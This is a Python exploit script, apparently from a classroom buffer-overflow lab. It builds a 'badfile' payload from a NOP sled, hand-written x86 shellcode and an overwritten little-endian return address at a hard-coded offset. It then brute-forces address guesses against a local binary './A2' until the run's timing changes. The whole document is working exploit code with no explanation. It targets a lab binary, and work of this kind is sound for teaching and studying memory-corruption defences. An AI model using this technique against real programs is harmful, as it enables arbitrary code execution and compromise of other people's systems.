#!/usr/bin/python3
import sys
def get_content(num):
	# Replace the content with the actual shellcode
	shellcode = ("\x6A\x07\x6A\x01\xBB\x86\x62\x55\x56\xFF\xD3\x6A\x00\x6A\x11\xFF\xD3\x6A\x05\x50\xFF\xD3\x6A\x00\x50\xFF\xD3\x6A\x00\x50\xFF\xD3\x6A\x03\x50\xFF\xD3").encode('latin-1')

	# Fill the content with NOP's
	content = bytearray(0x90 for i in range(2217))

	##################################################################
	# Put the shellcode somewhere in the payload
	start = 2200 - len(shellcode)               # Change this number 
	content[start:start + len(shellcode)] = shellcode

	# Decide the return address value 
	# and put it somewhere in the payload
	ret    = 0xffffc878+ num           # Change this number 
	# ret = 0x565562d1
	print("ret = ",hex(ret))
	offset = 749+4              # Change this number 

	L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
	content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
	##################################################################
	return content

import os,time,sys

if len(sys.argv) == 1:

	for i in range(2000,2001):
		# Write the content to a file
		with open('badfile', 'wb') as f:
		  f.write(get_content(i))
		print("i=",i)
		s=time.time()
		os.system("./A2")
		if time.time() -s > 1.0:
			break
else:
	with open('badfile', 'wb') as f:
		f.write(get_content(int(sys.argv[1])))
